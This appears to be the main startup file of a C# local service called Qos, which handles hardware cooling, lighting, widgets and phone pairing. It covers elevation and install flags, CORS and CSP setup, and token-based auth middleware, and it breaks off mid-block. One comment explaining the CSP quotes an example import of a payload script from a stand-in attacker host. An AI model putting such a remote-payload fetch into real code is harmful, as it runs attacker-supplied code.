// Qos local service — Minimal API host for Native AOT.
//
// Default bind: http://localhost:9400.
// Override with the first command-line arg:
//     qos-service http://localhost:9400

using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text.Json.Serialization;
using Qos.Service.Activity;
using Qos.Service.Auth;
using Qos.Service.Cooling;
using Qos.Service.DependencyInjection;
using Qos.Service.Lighting;
using Qos.Service.Lighting.Engine;
using Qos.Service.Persistence;
using Qos.Service.Platform;
using Qos.Service.Routes;
using Qos.Service.Security;
using Qos.Service.Serialization;
using Qos.Service.Sockets;

// Elevated PawnIO driver install — runs as a separate elevated child of the
// main service process. Must be checked BEFORE the single-instance mutex,
// since we're briefly a second instance during the install.
if (args.Length > 0 && args[0] == "--install-pawnio")
{
    return Qos.Service.Lifecycle.PawnIoInstaller.RunElevatedInstall();
}

// Install / uninstall / recovery primitives. Each one short-circuits the
// daemon startup and returns immediately - none of these modes ever build
// the WebApplication. Self-elevation happens inside the installer when
// required.
#if WINDOWS
if (args.Length > 0)
{
    var firstFlag = args[0];
    if (string.Equals(firstFlag, "--install", StringComparison.OrdinalIgnoreCase))
    {
        return Qos.Service.Lifecycle.WindowsServiceInstaller.RunInstall(args);
    }
    if (string.Equals(firstFlag, "--uninstall", StringComparison.OrdinalIgnoreCase))
    {
        return Qos.Service.Lifecycle.WindowsServiceInstaller.RunUninstall(args);
    }
    if (string.Equals(firstFlag, "--start-service", StringComparison.OrdinalIgnoreCase))
    {
        return Qos.Service.Lifecycle.WindowsServiceInstaller.RunStartService();
    }
    if (string.Equals(firstFlag, "--helper", StringComparison.OrdinalIgnoreCase)
        || string.Equals(firstFlag, "--tray", StringComparison.OrdinalIgnoreCase))
    {
        // --tray is the legacy alias kept for existing HKCU\Run entries on
        // pre-helper installs. Both route to the same user-session companion.
        return Qos.Service.Lifecycle.WindowsUserHelper.Run(args);
    }
    if (string.Equals(firstFlag, "--open-app", StringComparison.OrdinalIgnoreCase))
    {
        // One-shot invoked by the service via schtasks when the desktop
        // widget context menu's "Open dashboard" item is clicked. We just
        // run the same Edge --app launcher the tray uses and exit.
        Qos.Service.Platform.Windows.TrayIcon.OpenLocalWindow();
        return 0;
    }
}

// No-args (and not --service / --install / --tray / --no-window etc.)
// means the user double-clicked Qos.exe. Once the SCM service is in
// charge of running the daemon, the launcher's only jobs are: detect
// service state, spawn the tray if missing, open the dashboard. The
// old cold-start self-elevation path is dead - the service is already
// LocalSystem, so prompting the user for UAC here would be useless.
// No need to check serviceMode here - SCM never invokes the daemon with
// zero arguments; the binPath we register always includes --service.
if (args.Length == 0)
{
    return Qos.Service.Lifecycle.WindowsLauncher.Run();
}
#endif

// --service mode: run under SCM as a real Windows Service. The SCM dispatcher
// blocks the main thread, so we let WindowsServiceHost orchestrate startup
// and stop signals; the app itself is built normally below and torn down via
// the CancellationToken passed to RunAsync. Single-instance mutex and
// auto-elevation are short-circuited because SCM owns lifecycle here.
var serviceMode = args.Any(a => string.Equals(a, "--service", StringComparison.OrdinalIgnoreCase));
if (serviceMode)
{
    args = args.Where(a => !string.Equals(a, "--service", StringComparison.OrdinalIgnoreCase)).ToArray();
}

// Protocol-handler URLs from the dashboard. The new world (Qos as a
// LocalSystem Windows Service) replaces the old "start-admin"
// self-elevation pathway with a "restart-service" that calls into
// sc.exe. Both URLs are handled here so legacy dashboard builds still
// work (start-admin now just maps to restart-service - the service is
// already LocalSystem, so "restart as admin" is meaningless).
#if WINDOWS
if (args.Length > 0
    && (args[0].StartsWith("qos://restart-service", StringComparison.OrdinalIgnoreCase)
        || args[0].StartsWith("qos://start-admin", StringComparison.OrdinalIgnoreCase)))
{
    return Qos.Service.Lifecycle.WindowsServiceInstaller.RunStartService();
}
#endif

// --relaunch-elevated is set by ProcessRelauncher when the prior unelevated
// instance asked Windows to spawn us with UAC. The prior instance is exiting
// concurrently; wait for its single-instance mutex to free up before we try
// to claim it. Without the wait, a fast UAC ack would race the parent's exit
// and we'd see "already running" and bail.
var isRelaunchElevated = args.Length > 0 && args[0] == "--relaunch-elevated";
if (isRelaunchElevated)
{
    args = args.Skip(1).ToArray();
}

// --no-window suppresses the auto-launched dashboard Edge window on startup.
// Set by the WindowsStartupProvider when registering the logon-triggered
// schtask: when the user enables "Start Qos on system startup", the
// service should come up silently in the background. Manual launches (tray
// click, double-click, qos:// protocol) still open the window through
// the second-instance path or the explicit tray handler.
var suppressStartupWindow = args.Any(a =>
    string.Equals(a, "--no-window", StringComparison.OrdinalIgnoreCase));
if (suppressStartupWindow)
{
    args = args.Where(a =>
        !string.Equals(a, "--no-window", StringComparison.OrdinalIgnoreCase)).ToArray();
}

// Capture stdout / stderr to a rotating service.log file before anything else
// writes to the console. Doesn't change Console behaviour - just tees output.
Qos.Service.Platform.ServiceLog.Initialize();

var url = ServiceLaunchIntent.ResolveServiceUrl(args);
var servicePort = ServiceLaunchIntent.ResolveServicePort(url);

// Single-instance guard — if another qos-service is already running,
// open or focus the dashboard window instead of spawning a second service.
// When relaunching elevated, retry for up to 10s while the parent shuts down.
// Skipped under SCM: the service controller already enforces single-instance.
System.Threading.Mutex? singleInstance = null;
if (!serviceMode)
{
    bool isFirst;
    var deadline = DateTime.UtcNow.AddSeconds(isRelaunchElevated ? 10 : 0);
    while (true)
    {
        singleInstance = new System.Threading.Mutex(true, "Global\\QosServiceMutex", out isFirst);
        if (isFirst) break;
        singleInstance.Dispose();
        singleInstance = null;
        if (!isRelaunchElevated || DateTime.UtcNow >= deadline)
        {
            Console.WriteLine("[qos-service] already running, opening dashboard window");
            OpenExistingServiceWindow(servicePort);
            return 0;
        }
        System.Threading.Thread.Sleep(150);
    }
}
using var _singleInstance = singleInstance;

// Cold-start self-elevation: when the user double-clicks the EXE while no
// service is running and we're not yet elevated, prompt for UAC and let the
// elevated child take over the mutex. The manifest is asInvoker, so this is
// the only path that triggers a UAC prompt; subsequent double-clicks while
// the service is running hit the second-instance handoff above and never
// prompt. --no-window means schtask logon launch - skip auto-elevate so we
// don't ambush the user with UAC at sign-in. --service skips because SCM
// already runs us as LocalSystem.
if (OperatingSystem.IsWindows()
    && !isRelaunchElevated
    && !suppressStartupWindow
    && !serviceMode
    && !Qos.Service.Platform.ProcessElevation.GetCurrent().IsElevated)
{
    var coldStartElevation = Qos.Service.Lifecycle.ProcessRelauncher.TryRelaunchAsAdmin();
    if (coldStartElevation == Qos.Service.Lifecycle.RelaunchResult.Started)
    {
        return 0;
    }
    // UAC denied or relaunch failed: fall through and start unelevated.
}

// Bind on all interfaces so phones on the same LAN can reach the panel
// phone pairing surface without internet.
var httpsPort = servicePort == 9400 ? 9443 : servicePort + 443;
X509Certificate2? localHttpsCertificate = null;
try
{
    localHttpsCertificate = LocalHttpsCertificate.LoadOrCreate();
}
catch (Exception ex)
{
    Console.Error.WriteLine($"[qos-service] local HTTPS disabled: {ex.Message}");
}

// Set content root to the exe's directory so wwwroot/ is found
// regardless of which directory the user double-clicks from.
var exeDir = AppContext.BaseDirectory;
var builder = WebApplication.CreateSlimBuilder(new WebApplicationOptions
{
    Args = args,
    ContentRootPath = exeDir,
    WebRootPath = Path.Combine(exeDir, "wwwroot"),
});
// Kestrel + form upload body limits. Default Kestrel cap is 30 MB which drops
// larger multipart uploads before /media/import sees them (the browser then
// reports "could not reach the service"). Match MediaImporter.MaxFileSize so
// the route-level check is the only place we reject oversized uploads.
builder.WebHost.ConfigureKestrel(k =>
{
    k.Limits.MaxRequestBodySize = Qos.Service.Media.MediaImporter.MaxFileSize;
    k.ListenAnyIP(servicePort);
    if (localHttpsCertificate is not null)
    {
        k.ListenAnyIP(httpsPort, o => o.UseHttps(localHttpsCertificate));
    }
});
builder.Services.Configure<Microsoft.AspNetCore.Http.Features.FormOptions>(o =>
{
    o.MultipartBodyLengthLimit = Qos.Service.Media.MediaImporter.MaxFileSize;
    o.ValueLengthLimit = int.MaxValue;
});

// JSON - source-generated for AOT (no reflection). Enums serialize as
// integers by default; opt specific enums into string form with a typed
// JsonStringEnumConverter<TEnum> on the type, never the non-generic global
// converter (not AOT-safe).
builder.Services.ConfigureHttpJsonOptions(o =>
{
    o.SerializerOptions.TypeInfoResolverChain.Insert(0, AppJsonContext.Default);
});

// CORS - loopback for the bundled SPA, plus the public web app at
// nexusqos.com (HTTPS only). The hosted SPA fetches /pair to obtain a token,
// then talks to the local service on http://localhost:9400 from the browser.
// Token-based auth still gates every state-changing endpoint, so widening the
// origin list does not weaken the CSRF posture - the attacker would still need
// the per-installation token, which only loopback callers can request.
var allowedOrigins = BuildAllowedOrigins(servicePort, localHttpsCertificate is not null ? httpsPort : 0);
#if DEBUG
// Debug build: accept any http://localhost:* or http://127.0.0.1:* so the
// Vite dev server on a random port (5173-5180 etc.) can reach the service
// during frontend iteration. Loopback-only, no public surface exposed.
builder.Services.AddCors(c => c.AddDefaultPolicy(p => p
    .SetIsOriginAllowed(origin =>
        origin.StartsWith("http://localhost:", StringComparison.OrdinalIgnoreCase) ||
        origin.StartsWith("http://127.0.0.1:", StringComparison.OrdinalIgnoreCase))
    .AllowAnyMethod()
    .AllowAnyHeader()));
#else
// Release/AOT build: strict whitelist so production only accepts the SPA
// served from the service itself.
builder.Services.AddCors(c => c.AddDefaultPolicy(p => p
    .WithOrigins(allowedOrigins)
    .AllowAnyMethod()
    .AllowAnyHeader()));
#endif

builder.Services.AddHttpClient();

// All DI registrations live in per-domain extension methods under
// src/DependencyInjection/. Order matters only where there are cross-domain
// dependencies (e.g. Lighting consumes the OpenRGB controller registered in
// AddQosLighting before AddQosDevices uses it as ILightingDeviceProvider).
builder.Services
    .AddQosCore()
    .AddQosSensors()
    .AddQosCooling()
    .AddQosBenchmarks()
    .AddQosLighting()
    .AddQosDevices()
    .AddQosPeripherals()
    .AddQosActivity()
    .AddQosNetwork()
    .AddQosLifecycle()
    .AddQosWeather()
    .AddQosWidgets()
    .AddQosPanel(servicePort)
    .AddQosLinuxDBus()
    .AddQosHelper();

// ── Build ──
var app = builder.Build();

// Eager-init the GPU context on the main thread. macOS AppKit throws
// 'NSWindow should only be instantiated on the main thread' if GLFW tries
// to create its hidden window from a thread-pool thread later. Windows /
// Linux don't care, but paying a ~50ms init cost on startup is cheap.
Console.WriteLine("[gpu] pre-init on main thread…");
try
{
    var gpu = app.Services.GetRequiredService<Qos.Service.Lighting.Engine.Gpu.GpuContext>();
    lock (gpu.Lock)
    {
        gpu.EnsureInitializedLocked();
    }
    Console.WriteLine($"[gpu] pre-init done, available={app.Services.GetRequiredService<Qos.Service.Lighting.Engine.Gpu.GpuContext>().Available}");
}
catch (Exception ex)
{
    Console.Error.WriteLine($"[gpu] pre-init threw: {ex}");
}

// Initialize profile system — creates Default profile if none exists.
{
    var profileManager = app.Services.GetRequiredService<ProfileManager>();
    try
    {
        profileManager.Initialize();
    }
    catch (Exception ex)
    {
        Console.Error.WriteLine($"[profiles] initialization failed: {ex.Message}");
    }

    var fans = app.Services.GetRequiredService<IFanControlProvider>();
    var curveEngine = app.Services.GetRequiredService<CurveEngine>();
    var lightingEngine = app.Services.GetRequiredService<LightingEngine>();
    profileManager.OnProfileSwitched += () =>
    {
        try
        {
            fans.ReleaseAll();
            curveEngine.ResetSmoothing();
            lightingEngine.Stop();
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[profiles] reapply failed: {ex.Message}");
        }
    };
}

// Wire BeatsProvider → MultiplexHub: start/stop capture on first/last subscriber
// to the "beats" topic, forward OnBeat events as enveloped messages.
{
    var beatsProvider = app.Services.GetRequiredService<IBeatsProvider>();
    var muxHub = app.Services.GetRequiredService<MultiplexHub>();
    beatsProvider.OnBeat += result =>
    {
        if (muxHub.TopicHasSubscribers("beats"))
        {
            var env = WsEnvelope.Build("beats", result, AppJsonContext.Default.MusicResult);
            _ = muxHub.BroadcastTopicAsync("beats", env);
        }
        if (muxHub.TopicHasSubscribers("audio"))
        {
            var snap = new Qos.Service.Models.Lighting.AudioStateSnapshot
            {
                Level = Qos.Service.Lighting.Engine.AudioState.Level,
                Bass = Qos.Service.Lighting.Engine.AudioState.Bass,
                Mid = Qos.Service.Lighting.Engine.AudioState.Mid,
                High = Qos.Service.Lighting.Engine.AudioState.High,
                Beat = Qos.Service.Lighting.Engine.AudioState.Beat,
                Spectrum = new List<float>(Qos.Service.Lighting.Engine.AudioState.Spectrum),
            };
            var audioEnv = WsEnvelope.Build("audio", snap, AppJsonContext.Default.AudioStateSnapshot);
            _ = muxHub.BroadcastTopicAsync("audio", audioEnv);
        }
    };
    muxHub.OnTopicFirstSubscriber += topic => { if (topic == "beats") beatsProvider.Start(); };
    muxHub.OnTopicLastUnsubscriber += topic => { if (topic == "beats" && !muxHub.TopicHasSubscribers("beats")) beatsProvider.Stop(); };

    // Phone presence: when the first phone subscribes (or the last leaves) to
    // panel/phone/presence, the dashboard's connected-count needs to refresh.
    // Reuse the existing panel/device topic so usePanelDevices subscribes
    // once and gets both the device-list and the connected-count signal.
    muxHub.OnTopicFirstSubscriber += topic =>
    {
        if (topic == Qos.Service.Panel.PanelPhonePairingService.PresenceTopic)
            Qos.Service.Sockets.PanelTopics.BroadcastPanelDevice(muxHub, "presence");
    };
    muxHub.OnTopicLastUnsubscriber += topic =>
    {
        if (topic == Qos.Service.Panel.PanelPhonePairingService.PresenceTopic)
            Qos.Service.Sockets.PanelTopics.BroadcastPanelDevice(muxHub, "presence");
    };

    // Auto-resume Music Reactive capture if the user had it on before a restart.
    var store = app.Services.GetRequiredService<Qos.Service.Persistence.IConfigStore>();
    if (store.Load().Lighting.MusicReactive)
    {
        beatsProvider.Start();
    }
}

// Middleware pipeline
var wsOptions = new WebSocketOptions();
#if !DEBUG
// Release/AOT: pin WS to the service's own origins.
foreach (var origin in allowedOrigins)
{
    wsOptions.AllowedOrigins.Add(origin);
}
// In Debug we leave AllowedOrigins empty so the WS handshake accepts any
// loopback origin (matches the loose HTTP CORS above). Token-based auth on
// the query string still gates authenticated endpoints.
#endif
app.UseWebSockets(wsOptions);

app.Use(async (ctx, next) =>
{
    ctx.Response.OnStarting(() =>
    {
        var path = ctx.Request.Path.Value ?? string.Empty;
        var noCacheShell =
            path == "/" ||
            path.Equals("/index.html", StringComparison.OrdinalIgnoreCase) ||
            path.Equals("/sw.js", StringComparison.OrdinalIgnoreCase) ||
            path.Equals("/manifest.webmanifest", StringComparison.OrdinalIgnoreCase) ||
            path.Equals("/panel-phone.webmanifest", StringComparison.OrdinalIgnoreCase) ||
            path.StartsWith("/panel", StringComparison.OrdinalIgnoreCase);

        if (noCacheShell)
        {
            ctx.Response.Headers.CacheControl = "no-store, no-cache, max-age=0, must-revalidate";
            ctx.Response.Headers.Pragma = "no-cache";
            ctx.Response.Headers.Expires = "0";
        }

        // CSP: applied to HTML responses (the panel SPA + any /panel/* shell).
        // Module workers inherit their creator document's CSP, so a policy
        // here also gates `import()` calls inside Tier 2 widget workers —
        // blocking `import("https://attacker.com/payload.js")` while still
        // allowing same-origin sibling imports under /widgets-api/code/...
        //
        // 'unsafe-inline' on script-src/style-src is required for the SPA's
        // bootstrap script + React inline styles. It doesn't widen the
        // worker-import attack surface — `import()` resolution checks
        // host-source matches against the URL's origin, not against inline.
        var contentType = ctx.Response.ContentType ?? string.Empty;
        var isHtml = contentType.StartsWith("text/html", StringComparison.OrdinalIgnoreCase);
        if (isHtml || noCacheShell)
        {
            ctx.Response.Headers["Content-Security-Policy"] =
                "default-src 'self'; " +
                "script-src 'self' 'unsafe-inline' blob:; " +
                "worker-src 'self' blob:; " +
                "child-src 'self' blob:; " +
                "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
                "font-src 'self' data: https://fonts.gstatic.com; " +
                "img-src 'self' data: blob:; " +
                "connect-src 'self' ws: wss:; " +
                "frame-ancestors 'none'; " +
                "base-uri 'self'; " +
                "object-src 'none'";
            ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
        }

        return Task.CompletedTask;
    });
    await next();
});

app.UseDefaultFiles();
app.UseStaticFiles();

app.UseRouting();
app.UseCors();

// Auth middleware
app.Use(async (ctx, next) =>
{
    // OPTIONS preflight passes through
    if (string.Equals(ctx.Request.Method, "OPTIONS", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    var path = ctx.Request.Path.Value ?? "";

    // Public paths
    if (path.Equals("/ping", StringComparison.OrdinalIgnoreCase) ||
        path.Equals("/pair", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    // Pair Remote killswitch state read. Public so paired phones can poll for
    // re-enable while their session is locked out. The body is a single
    // boolean - not sensitive, and learning "the host has disabled remotes"
    // is exactly the information the locked-out client needs to render a
    // graceful "disabled" UI instead of hammering reconnects. Kept here with
    // the other public paths so the bypass list stays contiguous; any new
    // gate added below this point will not accidentally affect it.
    if (ctx.Request.Method == "GET" &&
        path.Equals("/panel/phone/remote-control", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    // Short-lived phone-panel pairing claims are validated at the handler level.
    if (path.Equals("/panel/phone/claim", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    // The phone QR opens the SPA shell without an Authorization header. iOS may
    // report the navigation as cross-site after the QR/certificate handoff, so
    // allow only this GET shell route here; the claim/API calls are still gated.
    if (ctx.Request.Method == "GET" &&
        path.Equals("/panel/phone", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    // (Per-widget iframe origin removed - declarative renderer now serves
    // widget views directly from the manifest. Widget asset GETs are
    // routed through /widgets-api/installed/{id}/asset/... and go
    // through the regular bearer/AllowPanel auth path.)

    // Module-worker code sessions. The URL itself carries a per-spawn
    // 24-byte random token (/widgets-api/code/{sessionId}/...) that the
    // route handler validates. Bypassing the Bearer check here lets the
    // browser's ESM loader fetch sibling files (`import "./lib/x.js"`)
    // inside a worker without us needing cookie auth on the panel surface.
    if (ctx.Request.Method == "GET" &&
        path.StartsWith("/widgets-api/code/", StringComparison.OrdinalIgnoreCase))
    {
        await next(ctx);
        return;
    }

    // Static file extensions
    if (path.EndsWith(".js") || path.EndsWith(".css") || path.EndsWith(".svg") ||
        path.EndsWith(".png") || path.EndsWith(".ico") || path.EndsWith(".webmanifest") ||
        path.EndsWith(".html") || path.EndsWith(".json") || path.EndsWith(".woff2"))
    {
        await next(ctx);
        return;
    }

    // SPA shell fallback — only for unmatched top-level browser navigations.
    // Matched API routes must still authenticate even when a client sends
    // Accept: text/html without Sec-Fetch-Site.
    //
    // GET-only is important: Sec-Fetch-Site: none is also sent on POSTs from
    // the address bar (e.g. curl with no Origin), but we never want a POST to
    // state-changing endpoints to ride the auth-bypass lane.
    if (AuthRequestPolicy.IsSpaShellFallbackAllowed(ctx))
    {
        await next(ctx);
        return;
    }

    // Localhost-only routes (service control: stop, startup-mode) are
    // rejected with 404 for any non-loopback caller, before token
    // validation so the route's existence is never leaked to LAN scanners.
    if (ctx.GetEndpoint()?.Metadata.GetMetadata<LocalhostOnlyAccess>() is not null)
    {
        var remote = ctx.Connection.RemoteIpAddress;
        if (remote is null || !IPAddress.IsLoopback(remote))
        {
            ctx.Response.StatusCode = StatusCodes.Status404NotFound;
            return;
        }
    }

    var tokens = ctx.RequestServices.GetRequiredService<TokenService>();
    var panelPairing = ctx.RequestServices.GetRequiredService<Qos.Service.Panel.PanelPhonePairingService>();
    var requestToken = AuthRequestPolicy.ExtractBearerOrQueryToken(ctx);
    if (tokens.Validate(requestToken))
    {
        await next(ctx);
        return;
    }

    var cookieToken = ctx.Request.Cookies[Qos.Service.Panel.PanelPhonePairingService.SessionCookieName];
    string sessionId = "";
    var hasPanelSession =
        panelPairing.TryValidateSessionToken(requestToken, ctx, out sessionId) ||
        (!string.Equals(requestToken, cookieToken, StringComparison.Ordinal) &&
         panelPairing.TryValidateSessionToken(cookieToken, ctx, out sessionId));
    if (hasPanelSession)
    {
        // Pair Remote killswitch. When OFF, any request authenticated via a
        // phone-session token is rejected even though the session is otherwise
        // valid. The matching WS sockets have already been closed by
        // SetRemoteControlEnabledAsync; this guards new HTTP / WS upgrade
        // attempts from previously-paired devices.
        if (!panelPairing.GetRemoteControlEnabled())
        {
            await Qos.Service.Auth.AuthErrorResponse.WriteAsync(ctx, 403, "RemoteDisabled", "Remote control is currently disabled.");
            return;
        }

        if (AuthRequestPolicy.RejectsInsecureCsrf(ctx))
        {
            await Qos.Service.Auth.AuthErrorResponse.WriteAsync(ctx, 403, "CSRF", "Cross-site request blocked.");
            return;
        }

        if (AuthRequestPolicy.IsPanelSessionAllowed(ctx))
        {
            // Tag the request so the /ws upgrade can register the
            // resulting socket with MultiplexHub under this phone-session
            // id - that's how KickPhoneSessionsAsync / KickAllPhoneAsync
            // find the right sockets to close.
            if (!string.IsNullOrEmpty(sessionId))
                ctx.Items["PhoneSessionId"] = sessionId;
            await next(ctx);
            return;
        }

        await Qos.Service.Auth.AuthErrorResponse.WriteAsync(ctx, 403, "Forbidden", "This action requires the desktop app.");
        return;
    }

    await Qos.Service.Auth.AuthErrorResponse.WriteAsync(ctx, 401, "Unauthorized", "This panel is not paired with the Qos service.");
});

// ── Map all routes ──
app.MapPingEndpoints();
app.MapDefaultsEndpoints();
app.MapAuthEndpoints();
app.MapSystemEndpoints();
app.MapServiceControlEndpoints();
app.MapCoolingEndpoints();
app.MapBenchmarkEndpoints();
app.MapLightingEndpoints();
app.MapObsEndpoints();
app.MapSteamEndpoints();
app.MapDiscordEndpoints();
app.MapDevicesEndpoints();
app.MapPeripheralEndpoints();
app.MapKeebEndpoints();
app.MapDisplayEndpoints();
app.MapActivityEndpoints();
app.MapLifecycleEndpoints();
app.MapMediaLibraryEndpoints();
app.MapProfileEndpoints();
app.MapPanelEndpoints();
app.MapPanelMacroRoutes();
app.MapOverlayEndpoints();
app.MapWeatherEndpoints();
app.MapWidgetEndpoints();
app.MapConflictEndpoints();
app.MapWebSocketEndpoints();

{
    var pairing = app.Services.GetRequiredService<Qos.Service.Panel.PanelPhonePairingService>();
    pairing.ServicePort = servicePort;
    pairing.HttpsPort = localHttpsCertificate is not null ? httpsPort : 0;
    pairing.SpkiFingerprint = localHttpsCertificate is not null
        ? Qos.Service.Security.LocalHttpsCertificate.ComputeSpkiBase64Url(localHttpsCertificate)
        : string.Empty;
}

// SPA fallback
app.MapFallbackToFile("index.html");

// Kill orphan processes from previous crashed sessions.
Qos.Service.Platform.FfmpegTracker.CleanupOrphans();
Qos.Service.Panel.PanelKioskLauncher.CleanupOrphans();
Qos.Service.Panel.PanelOverlayHostLauncher.CleanupOrphans();
Qos.Service.Lighting.Rgb.OpenRgbProcessManager.CleanupOrphans();

// Register qos:// protocol handler (idempotent — safe on every launch)
Qos.Service.Platform.ProtocolHandler.Register();

Console.WriteLine($"[qos-service] listening on {url}");

// System tray icon (Windows only) — hides console, shows tray with right-click menu.
// Skipped under --service: Session 0 cannot show UI, so the tray must be a
// separate user-session process (Phase 4: Qos.exe --tray). Leaving the tray
// init in here would create a stale NotifyIcon in Session 0 that nobody sees.
if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows) && !serviceMode)
{
    var panelLauncher = app.Services.GetRequiredService<Qos.Service.Panel.PanelKioskLauncher>();
    var store = app.Services.GetRequiredService<IConfigStore>();
    var desktopHostForTray = app.Services.GetRequiredService<Qos.Service.Panel.PanelOverlayHostLauncher>();
    Qos.Service.Platform.Windows.TrayIcon.Configure(
        9400,
        onExit: () =>
        {
            panelLauncher.Close();
            try { desktopHostForTray.Stop(); } catch { /* best-effort */ }
            Environment.Exit(0);
        },
        onTogglePanel: () =>
        {
            if (panelLauncher.IsRunning)
            {
                panelLauncher.Close();
            }
            else
            {
                panelLauncher.Launch();
            }
        },
        isPanelRunning: () => panelLauncher.IsRunning);

    var hub = app.Services.GetRequiredService<Qos.Service.Sockets.MultiplexHub>();
    Qos.Service.Platform.Windows.TrayIcon.ConfigureDesktop(
        onToggleOverlayTopmost: () =>
        {
            store.Update(s => s.Ui.OverlayWidgetsAlwaysOnTop = !s.Ui.OverlayWidgetsAlwaysOnTop);
            Qos.Service.Sockets.PanelTopics.BroadcastPrefs(hub);
        },
        isOverlayTopmost: () => store.Load().Ui.OverlayWidgetsAlwaysOnTop,
        hasOverlayWidgets: () => store.Load().Ui.OverlayLayout.Count > 0);

    Qos.Service.Platform.Windows.TrayIcon.SetVisible(store.Load().Ui.ShowWindowsTrayIcon);

    store.OnChanged += () =>
    {
        try
        {
            var show = store.Load().Ui.ShowWindowsTrayIcon;
            Qos.Service.Platform.Windows.TrayIcon.SetVisible(show);
        }
        catch { /* best-effort */ }
    };

}

// In service mode the helper is a separate long-lived user-session process
// connected over a named pipe. ShowWindowsTrayIcon no longer controls the
// helper's existence (it always runs so providers like screen-time stay
// alive); we just push the visibility flip down the pipe and let the helper
// hide/show its NotifyIcon in place.
#if WINDOWS
if (serviceMode)
{
    var trayStore = app.Services.GetRequiredService<IConfigStore>();
    var helperRegistry = app.Services.GetRequiredService<Qos.Service.Helper.HelperRegistry>();
    var lastVisible = trayStore.Load().Ui.ShowWindowsTrayIcon;

    // Push current state on every fresh helper connect. Handles first
    // bootstrap, service restart, helper crash-and-respawn.
    helperRegistry.Connected += conn =>
    {
        try
        {
            var current = trayStore.Load().Ui.ShowWindowsTrayIcon;
            _ = Qos.Service.Helper.Domains.TrayCommands.SetVisibleAsync(helperRegistry, current);
        }
        catch (Exception ex) { Console.Error.WriteLine($"[helper-sync] initial state failed: {ex.Message}"); }
    };

    trayStore.OnChanged += () =>
    {
        try
        {
            var nowVisible = trayStore.Load().Ui.ShowWindowsTrayIcon;
            if (nowVisible == lastVisible) return;
            lastVisible = nowVisible;
            _ = Qos.Service.Helper.Domains.TrayCommands.SetVisibleAsync(helperRegistry, nowVisible);
        }
        catch (Exception ex) { Console.Error.WriteLine($"[helper-sync] {ex.Message}"); }
    };

    // Helper-initiated stop. The tray "Shut down" item sends this over
    // the already-authenticated pipe rather than calling sc.exe stop -
    // the service's SCM DACL only grants Authenticated Users
    // QUERY_STATUS + START, not STOP, so an unelevated user-session
    // helper cannot stop the daemon via SCM. StopApplication runs the
    // same graceful path /service/stop uses; the ApplicationStopping
    // hook below then notifies the helper back via helper.shutdown.
    helperRegistry.InboundEnvelope += (_, env) =>
    {
        if (env.Type != "service.requestStop") return;
        try { app.Lifetime.StopApplication(); }
        catch (Exception ex) { Console.Error.WriteLine($"[helper-sync] requestStop failed: {ex.Message}"); }
    };

    // Quitting the service must take the user-session UI with it: close
    // the --app window and exit the helper so the tray icon disappears.
    // Without this, "Stop Qos" in the settings UI would stop the daemon
    // but leave an orphaned Edge --app window pointing at a dead port and
    // a stale tray icon in the user session. The helper's pipe drops a
    // moment later when the service host tears down its pipe server.
    app.Lifetime.ApplicationStopping.Register(() =>
    {
        try
        {
            // Short timeout: the host is about to tear down the pipe
            // server, so a slow helper can't be allowed to delay shutdown.
            // Single-shot GetAny() snapshot: a helper reconnecting mid-
            // teardown won't be notified, which is fine while Phase 1
            // ships single-session; revisit if multi-user lands.
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));
            Qos.Service.Helper.Domains.LifecycleCommands.SendShutdownAsync(helperRegistry, cts.Token).GetAwaiter().GetResult();
        }
        catch { /* helper may not be connected; nothing to do */ }
    });
}
#endif

// Cross-platform overlay host wiring (Windows qos-overlay.exe sidecar
// or Mac qos-overlay-helper Swift sidecar - same predicate either way).
// Reconciles on every settings change: run iff
// (OverlayWidgetsEnabled && layout.Count > 0); stop otherwise.
{
    var overlayHost = app.Services.GetRequiredService<Qos.Service.Panel.IOverlayHost>();
    var overlayStore = app.Services.GetRequiredService<IConfigStore>();
#if WINDOWS
    var overlayHelperRegistry = app.Services.GetService<Qos.Service.Helper.HelperRegistry>();
#endif
    overlayStore.OnChanged += () =>
    {
        try
        {
            var ui = overlayStore.Load().Ui;
            var shouldRun = ui.OverlayWidgetsEnabled && ui.OverlayLayout.Count > 0;
            if (shouldRun && !overlayHost.IsRunning)
            {
                overlayHost.Start();
            }
#if !WINDOWS
            else if (!shouldRun && overlayHost.IsRunning)
            {
                // Mac / other: the helper renders only widgets and has
                // no internal teardown path - killing it is the canonical
                // way to remove widgets from the screen when the layout
                // drops to zero or the user disables.
                // Windows skips this branch: the overlay process also
                // hosts the main dashboard window and tears down widget
                // HWNDs in-process via its own prefs poll, then idle-
                // exits once both widgets and dashboard are gone.
                overlayHost.Stop();
            }
#endif
#if WINDOWS
            // Push-notify the Windows overlay so it repolls preferences
            // immediately instead of waiting for its 5 s timer. No-op on
            // platforms where the helper / pipe doesn't exist.
            try
            {
                if (overlayHelperRegistry is not null)
                    _ = Qos.Service.Helper.Domains.LifecycleCommands.NotifyOverlayPrefsChangedAsync(overlayHelperRegistry);
            }
            catch { }
#endif
        }
        catch { /* best-effort */ }
    };

    app.Lifetime.ApplicationStarted.Register(() =>
    {
        var initialUi = overlayStore.Load().Ui;
        if (initialUi.OverlayWidgetsEnabled && initialUi.OverlayLayout.Count > 0)
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(2000);
                overlayHost.Start();
            });
        }
    });

    app.Lifetime.ApplicationStopping.Register(() =>
    {
        try { overlayHost.Stop(); } catch { /* best-effort */ }
    });
}

// Auto-launch app window on startup (Windows only, interactive session).
// Skipped when --no-window is passed (logon-triggered schtask path) so the
// service comes up silently; the user opens the dashboard from the tray.
if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
{
    app.Lifetime.ApplicationStarted.Register(() =>
    {
        if (serviceMode)
        {
            Console.WriteLine("[qos-service] startup window suppressed (LocalSystem session 0 has no interactive desktop)");
#if WINDOWS
